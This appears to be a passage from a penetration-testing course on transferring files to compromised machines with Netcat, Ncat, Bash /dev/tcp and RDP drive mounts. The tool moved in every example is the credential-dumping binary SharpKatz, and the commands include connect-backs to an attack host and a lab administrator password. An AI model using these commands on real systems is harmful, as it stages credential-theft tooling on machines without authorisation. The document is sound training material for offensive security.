We've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.

This section will cover alternative methods such as transferring files using [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) and using RDP and PowerShell sessions.

## Netcat

[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.
The flexibility and usefulness of this tool prompted the Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

In this section, we will use both the original Netcat and Ncat

## File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`

#### NetCat - Compromised Machine - Listening on Port 8000

	victim@target:~$ # Example using Original Netcat 
	victim@target:~$ nc -l -p 8000 > SharpKatz.exe

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

#### Ncat - Compromised Machine - Listening on Port 8000

	victim@target:~$ # Example using Ncat 
	victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine

	AstraX01@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe 
	AstraX01@htb[/htb]$ # Example using Original Netcat 
	AstraX01@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine

	AstraX01@htb[/htb]$ # Example using Original Netcat 
	AstraX01@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

#### Compromised Machine Connect to Netcat to Receive the File

	victim@target:~$ # Example using Original Netcat 
	victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe

Let's do the same with Ncat:

#### Attack Host - Sending File as Input to Ncat

	AstraX01@htb[/htb]$ # Example using Ncat 
	AstraX01@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe

#### Compromised Machine Connect to Ncat to Receive the File

	victim@target:~$ # Example using Ncat 
	victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
#### NetCat - Sending File as Input to Netcat

	AstraX01@htb[/htb]$ # Example using Original Netcat 
	AstraX01@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
#### Ncat - Sending File as Input to Ncat

	AstraX01@htb[/htb]$ # Example using Ncat 
	AstraX01@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

	victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

## RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

**If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.**

#### Mounting a Linux Folder Using rdesktop

	AstraX01@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

#### Mounting a Linux Folder Using xfreerdp

	AstraX01@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

